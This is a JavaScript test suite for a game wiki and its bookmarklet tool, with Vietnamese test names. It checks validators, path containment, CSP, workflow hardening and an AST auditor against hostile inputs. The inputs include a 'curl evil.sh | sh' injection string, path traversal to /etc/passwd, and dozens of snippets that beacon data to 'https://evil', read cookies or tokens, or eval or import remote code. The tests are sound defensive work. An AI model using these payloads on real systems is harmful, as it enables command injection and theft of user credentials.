import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateCatalog, containedPath } from '../lib/validate.mjs';
import { extractClient } from '../lib/client.mjs';
import { parseLiteral } from '../lib/literal.mjs';
import { request, TooLarge } from '../lib/http.mjs';
import { toWebp } from '../lib/image.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');
const goodCatalog = () => ({
  catalog_hash: 'a'.repeat(64),
  catalog: {
    species: Array.from({ length: 12 }, (_, i) => ({ id: `unit_h${i}`, catchable: true })),
    abilities: [{}], modifiers: [{}], display_names: [{ id: 'dn_1', value: 'Bulbasaur' }], research: [{ id: 'research_r000' }],
  },
});

test('catalog: hash chứa lệnh shell / id chứa đường dẫn bị từ chối', () => {
  assert.deepEqual(validateCatalog(goodCatalog()), []);
  const evilHash = goodCatalog(); evilHash.catalog_hash = '"; curl evil.sh | sh #';
  assert.ok(validateCatalog(evilHash).includes('catalog_hash'));
  const evilId = goodCatalog(); evilId.catalog.species[0].id = '../../.github/workflows/x';
  assert.ok(validateCatalog(evilId).length);
  const evilResearch = goodCatalog(); evilResearch.catalog.research[0].id = '..%2f..';
  assert.ok(validateCatalog(evilResearch).length);
  const evilName = goodCatalog(); evilName.catalog.display_names[0].value = '<a href="javascript:x">CUTD Helper</a>';
  assert.ok(validateCatalog(evilName).includes('display_names có ký tự lạ'));
  const evilSlot = goodCatalog(); evilSlot.catalog.trade = { slots: [{ slot: '<b>', recipes: [] }] };
  assert.ok(validateCatalog(evilSlot).includes('trade lạ'));
  const ghost = goodCatalog(); ghost.catalog.species[0].evolutions = [{ stage_id: 'unit_nope', cost: 10 }];
  assert.ok(validateCatalog(ghost).length);
  const shrunk = goodCatalog(); shrunk.catalog.species = shrunk.catalog.species.slice(0, 11);
  const before = goodCatalog(); before.catalog.species = Array.from({ length: 40 }, (_, i) => ({ id: `unit_h${i}`, catchable: true }));
  assert.ok(validateCatalog(shrunk, before).some(b => b.startsWith('species tụt')));
});

test('đường dẫn ảnh không thoát được khỏi public/<dir>/', () => {
  const pub = join(ROOT, 'public'), dirs = [join(pub, 'portraits')];
  assert.ok(containedPath(pub, dirs, 'portraits/pet_a.webp').endsWith('pet_a.webp'));
  for (const k of ['portraits/../../package.json', '../scripts/x.webp', '/etc/passwd', 'portraits', 'research/x.webp']) {
    assert.throws(() => containedPath(pub, dirs, k), k);
  }
});

test('bundle: tên model / màu bẩn bị lọc', () => {
  const c = extractClient('v={unit_h001:`../../x`,unit_h002:`ok_m`,unit_h003:`a b`},m={normal:[[1,2,3],[4,5,6],[7,8,9]],fire:[["red);background:url(//evil)",2,3],[4,5,6],[7,8,999]]}');
  assert.deepEqual(c.unitModel, { unit_h002: 'ok_m' });
  assert.deepEqual(c.elementColors.fire, [[0, 2, 3], [4, 5, 6], [7, 8, 255]]);
});

test('parser literal: __proto__ không đổi được prototype', () => {
  const { value } = parseLiteral('{__proto__:{polluted:1},constructor:{x:1},a:1}');
  assert.equal(Object.getPrototypeOf(value), Object.prototype);
  assert.equal(value.a, 1);
  assert.equal({}.polluted, undefined);
});

test('http: server trả dữ liệu khổng lồ bị cắt, không tràn RAM', async () => {
  const big = `data:application/octet-stream;base64,${Buffer.alloc(64 * 1024).toString('base64')}`;
  await assert.rejects(request(big, { maxBytes: 1024, retries: 0 }), TooLarge);
  assert.equal((await request(big, { maxBytes: 128 * 1024, retries: 0 })).body.length, 64 * 1024);
});

test('ảnh: chỉ nhận PNG thật', async () => {
  assert.throws(() => toWebp(Buffer.from('<svg onload=alert(1)>')), /PNG/);
  assert.throws(() => toWebp(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0])), /PNG/);
  const png = readFileSync(join(ROOT, 'public/favicon.png'));
  assert.ok((await toWebp(png)).subarray(8, 12).toString() === 'WEBP');
});

test('workflow: không chèn output/dữ liệu vào shell, action ghim SHA, quyền tối thiểu', () => {
  const yml = readFileSync(join(ROOT, '.github/workflows/site.yml'), 'utf8');
  const runs = [...yml.matchAll(/run: \|?\n?([\s\S]*?)(?=\n\s*- |\n\s*\w+:\n|$)/g)].map(m => m[1]);
  for (const r of runs) assert.doesNotMatch(r, /\$\{\{\s*(steps|needs|inputs|github\.event)\./, `run: có \${{ }} nguy hiểm:\n${r}`);
  for (const [, ref] of yml.matchAll(/uses:\s*(\S+)/g)) assert.match(ref, /@[0-9a-f]{40}$/, `action chưa ghim SHA: ${ref}`);
  assert.match(yml, /^permissions: \{\}$/m);
  assert.match(yml, /npm ci --ignore-scripts/);
});

test('wiki build có CSP, không script inline', () => {
  const cfg = readFileSync(join(ROOT, 'vite.config.js'), 'utf8');
  assert.match(cfg, /"default-src 'none'"/);
  assert.match(cfg, /`script-src \$\{HOME\}assets\/`/);
  for (const d of ['frame-src', 'child-src', 'worker-src', 'object-src']) assert.match(cfg, new RegExp(`"${d} 'none'"`), d);
  assert.doesNotMatch(cfg, /unsafe-eval|strict-dynamic|\s\*[\s;"`]/);
  assert.match(cfg, /`script-src \$\{HOME\}assets\/`,/, 'script-src chỉ đúng thư mục assets, không unsafe-inline');
  if (existsSync(join(ROOT, 'dist/index.html'))) {
    const csp = readFileSync(join(ROOT, 'dist/index.html'), 'utf8').match(/Content-Security-Policy" content="([^"]+)"/)?.[1] ?? '';
    assert.match(csp, /script-src https:\/\/long7400\.github\.io\/cutd-dex\/assets\/(;|$)|script-src http:\/\/localhost:\d+\/assets\//);
    assert.match(csp, /frame-src 'none'/);
  }
  for (const f of ['index.html', 'src/main.js', 'src/ui.js']) assert.doesNotMatch(readFileSync(join(ROOT, f), 'utf8'), /\son[a-z]+="/, f);
});

import { auditSource } from '../build-tool.mjs';

test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho phép', () => {
  const base = readFileSync(join(ROOT, 'tool/game-bridge.js'), 'utf8');
  const overlay = readFileSync(join(ROOT, 'tool/overlay.js'), 'utf8');
  const logic = readFileSync(join(ROOT, 'tool/logic.js'), 'utf8');
  const others = readdirSync(join(ROOT, 'tool')).filter(f => f.endsWith('.js') && !['game-bridge.js', 'overlay.js', 'logic.js'].includes(f)).map(f => [f, readFileSync(join(ROOT, 'tool', f), 'utf8')]);
  const clean = [['game-bridge.js', base], ['overlay.js', overlay], ['logic.js', logic], ...others];
  assert.ok(others.length >= 4, 'kiểm đủ mọi file tool/*.js');
  assert.deepEqual(auditSource(clean), [], 'code hiện tại phải qua kiểm tra');
  const attacks = {
    'ngoặc vuông': "export const x = g => g.session['sell' + 'Creature'](1);",
    'gán biến': 'export const x = g => { const s = g.session; s.sellCreature(1); };',
    'destructuring': 'export const x = g => { const { session } = g; return session; };',
    'hàm ngoài danh sách': 'export const x = g => g.session.sellCreature(1);',
    '.call': 'export const x = (f, g) => f.call(g);',
    'socket send': 'export const x = ws => ws.send("x");',
    'sendBeacon': 'export const x = () => navigator.sendBeacon("https://evil", "x");',
    'eval': 'export const x = s => eval(s);',
    'Function': 'export const x = s => new Function(s);',
    'Reflect': 'export const x = (g) => Reflect.get(g, "session");',
    'MouseEvent': 'export const x = el => new MouseEvent("click");',
    'localStorage': 'export const x = () => localStorage.getItem("token");',
    'cookie': 'export const x = () => document.cookie;',
    'innerHTML': 'export const x = el => { el.innerHTML = "<img onerror=alert(1)>"; };',
    'dispatch': 'export const x = g => g.store.dispatch({ type: "sell" });',
    'WebSocket.prototype': 'export const x = () => WebSocket.prototype.send;',
    'window.eval': 'export const x = s => window.eval(s);',
    'globalThis.Function': 'export const x = s => new globalThis.Function(s);',
    'window.fetch': "export const x = () => window.fetch('https://evil');",
    'window.localStorage': 'export const x = () => window.localStorage;',
    'window.XMLHttpRequest': 'export const x = () => new window.XMLHttpRequest();',
    'khoá ghép chuỗi': "export const x = g => g['ses' + 'sion'];",
    'khoá join': "export const x = w => w[['ev', 'al'].join('')]('1');",
    'gọi qua x[k]()': 'export const x = (o, k) => o[k]();',
    'truyền session vào mảng': 'export const x = g => [g.session].map(s => s.sellCreature());',
    'gán let': 'export const x = g => { let s; s = g.session; return s; };',
    'tham số destructuring': 'export const x = ({ session }) => session;',
    'setTimeout chuỗi': "export const x = () => setTimeout('alert(1)', 0);",
    'import()': "export const x = () => import('https://evil/x.js');",
    'thẻ script': "export const x = () => document.createElement('script');",
    'đổi location': "export const x = () => { location.href = 'https://evil'; };",
    'location.assign': "export const x = () => location.assign('https://evil');",
    'new Image beacon': "export const x = () => { new Image().src = 'https://evil/?' + document.title; };",
    'gán src': "export const x = el => { el.src = 'https://evil/x.js'; };",
    'getPrototypeOf': 'export const x = () => Object.getPrototypeOf({});',
    'setAttribute onclick': "export const x = el => el.setAttribute('onclick', 'alert(1)');",
    'window.open': "export const x = () => window.open('https://evil');",
    'h(script)': "export const x = h => h('script', { src: 'x' });",
    'h(onerror)': "export const x = h => h('img', { onerror: 'alert(1)' });",
    'template có thẻ': "export const x = d => d.createElement`script`;",
    'setTimeout template có thẻ': 'export const x = () => setTimeout`alert(1)`;',
    'ngoặc vuông chuỗi tới global cấm': "export const x = w => w['Function'];",
    'ngoặc vuông chuỗi tới fetch': "export const x = () => window['fetch']('https://evil');",
    'window[khoá biến]': "export const x = k => window[k];",
    'self[khoá biến]': "export const x = n => self[n]('1');",
    'self trơn': 'export const x = () => self;',
    'top trơn': 'export const x = () => top.location;',
    'destructuring cookie': 'export const x = () => { const { cookie } = document; return cookie; };',
    'destructuring storage': 'export const x = () => { const { sessionStorage: s } = window; return s; };',
    'destructuring fetch': 'export const x = () => { const { fetch: f } = window; return f; };',
    'destructuring khoá tính': "export const x = (o, k) => { const { [k]: f } = o; return f; };",
    'new WS': "const WS = win.WebSocket; export const x = () => new WS('wss://evil');",
    'new qua thành viên': "export const x = o => new o.Thing();",
    'setTimeout biến chuỗi': "export const x = () => { const f = 'alert(1)'; setTimeout(f); };",
    'ghi DOM qua khoá biến': "export const x = (d, key) => { d.body[key] = '<img src=x>'; };",
    'gán location.hash': "export const x = () => { location.hash = '#x'; };",
    'getJSON bí danh': "export const x = () => { const g = getJSON; g('https://evil'); };",
    'createContextualFragment': "export const x = r => r.createContextualFragment('<script></script>');",
    'DOMParser': 'export const x = () => new DOMParser();',
    'cookieStore': 'export const x = () => cookieStore.getAll();',
    'Object.assign src': "export const x = el => Object.assign(el, { src: 'https://evil' });",
    'defineProperty lạ': "export const x = o => Object.defineProperty(o, 'x', { get() { return 1; } });",
    'getOwnPropertyDescriptor lạ': 'export const x = o => Object.getOwnPropertyDescriptor(o, "session");',
    'chuỗi url(': "export const x = el => { el.style.cssText = 'background:url(https://evil/?' + 1 + ')'; };",
    'setAttribute ngoài h()': "export const x = (el, k) => el.setAttribute(k, 'x');",
  };
  for (const [name, snippet] of Object.entries(attacks)) {
    const files = [...clean.filter(([f]) => f !== 'logic.js'), ['logic.js', `${logic}\n${snippet}`]];
    const bridgeFiles = [['game-bridge.js', `${base}\n${snippet}`], ...clean.filter(([f]) => f !== 'game-bridge.js')];
    assert.ok(auditSource(files).length > 0 && auditSource(bridgeFiles).length > 0, `không chặn được: ${name}`);
  }
  assert.ok(auditSource([['overlay.js', overlay.replace("getJSON('/catalog'", "getJSON('https://evil/'")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
  const clash = overlay.replace("  const host = h('div'", "  function observe(type) { return type; }\n  const host = h('div'");
  assert.ok(clash !== overlay && auditSource([['overlay.js', clash], ['game-bridge.js', base], ['logic.js', logic]]).some(e => /observe trùng tên/.test(e)), 'hàm cục bộ trùng tên hàm import (gọi nhầm hàm) phải bị chặn');
  assert.ok(auditSource([['overlay.js', overlay.replace("right: ['KeyD', 'd']", "right: ['Enter', 'Enter']")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
});

test('bookmarklet: bản web — chỉ bấm nút chính của game, móc hàm chỉ trong game-bridge, không tạo sự kiện chuột', () => {
  const read = f => readFileSync(join(ROOT, 'tool', f), 'utf8');
  const files = ['game-bridge.js', 'overlay.js', 'logic.js', 'realm.js', 'web-input.js'].map(f => [f, read(f)]);
  assert.deepEqual(auditSource(files), [], 'code hiện tại phải qua kiểm tra');
  const withFile = (name, code) => auditSource([...files.filter(([f]) => f !== name), [name, code]]);
  const webIn = read('web-input.js'), overlay = read('overlay.js'), bridge = read('game-bridge.js');
  const attacks = {
    'bấm nút khác của game': () => withFile('web-input.js', webIn.replace('data-node="Primary"', 'data-node="Release"')),
    '.click() vào phần tử khác': () => withFile('web-input.js', `${webIn}\nexport const z = el => el.click();`),
    '.click() ngoài web-input': () => withFile('overlay.js', `${overlay}\nconst z = primary => primary.click();`),
    'tạo PointerEvent': () => withFile('web-input.js', `${webIn}\nexport const z = () => new PointerEvent('pointerdown');`),
    'đọc localStorage': () => withFile('web-input.js', `${webIn}\nexport const z = () => localStorage.getItem('x');`),
    'phím ngoài W/A/S/D': () => withFile('overlay.js', overlay.replace("right: ['KeyD', 'd']", "right: ['KeyM', 'm']")),
    'dispatchEvent ngoài phím camera': () => withFile('web-input.js', `${webIn}\nexport const z = target => target.dispatchEvent(1);`),
    'bẫy khoá khác trên Object.prototype': () => withFile('game-bridge.js', bridge.replace('_selectedEntityId: o =>', 'toJSON: o =>')),
    'Object.prototype ngoài game-bridge': () => withFile('overlay.js', `${overlay}\nObject.prototype.x = 1;`),
  };
  for (const [name, run] of Object.entries(attacks)) assert.ok(run().length > 0, `không chặn được: ${name}`);
});

import { missingSignatures, unknownShapes } from '../check-clients.mjs';

test('canary: nhận ra khi game đổi tên hàm tool dựa vào, và dạng kỹ năng lạ', () => {
  const web = 'e.onmessage=e=>{let t=sL(typeof e.data==`string`?e.data:``) this.nextSequence=1,this._selectedEntityId=null catchWild(e){return this.dispatch( evolveCreature(e,t){ tradePet(e,t){return this.dispatch( moveCreature(e,t){return this.dispatch({type:`move_unit` get ground(){return this._ground} selectEntity(e,t){e.entities.has(t) {Unit:`u`,Creep:`c`,Wild:`w`,TradeOffer:`t` this.el.dataset.node=t.name `Primary`';
  assert.deepEqual(missingSignatures('web', web), []);
  assert.deepEqual(missingSignatures('web', web.replace('this.nextSequence=1', 'this.seq=1')), ['session.nextSequence (móc hàm game)']);
  const shapes = unknownShapes({ abilities: [{ id: 'x', status: 'executable', trigger: { kind: 'on_moon' }, effects: [{ kind: 'damage', magnitude: { basis: 'attack_damage' } }] }] });
  assert.deepEqual(shapes, ['trigger "on_moon" (vd x)']);
});

import { checkGlb } from '../art.mjs';
import { showcaseModels } from '../../src/lib/showcase.js';
import { SAFE_NAME } from '../lib/validate.mjs';

test('art: chỉ nhận GLB v2 nhúng sẵn, từ chối file lạ / trỏ ra ngoài; tên model an toàn', () => {
  const glb = json => {
    const j = Buffer.from(JSON.stringify(json).padEnd(Math.ceil(JSON.stringify(json).length / 4) * 4, ' '));
    const head = Buffer.alloc(20);
    head.write('glTF', 0); head.writeUInt32LE(2, 4); head.writeUInt32LE(20 + j.length, 8); head.writeUInt32LE(j.length, 12); head.write('JSON', 16);
    return Buffer.concat([head, j]);
  };
  assert.doesNotThrow(() => checkGlb(glb({ asset: { version: '2.0' }, buffers: [{ byteLength: 0 }] })));
  assert.throws(() => checkGlb(glb({ asset: { version: '2.0' }, images: [{ uri: 'https://evil/x.png' }] })), /file ngoài/);
  assert.throws(() => checkGlb(glb({ asset: { version: '2.0' }, buffers: [{ uri: 'data:application/octet-stream;base64,AA==' }] })), /file ngoài/);
  assert.throws(() => checkGlb(Buffer.from('<html>not a model</html>')), /GLB/);
  const db = JSON.parse(readFileSync(join(ROOT, 'src/data/db.json'), 'utf8'));
  const models = showcaseModels(db);
  assert.ok(models.length >= 20);
  assert.ok(models.every(m => SAFE_NAME.test(m)));
});
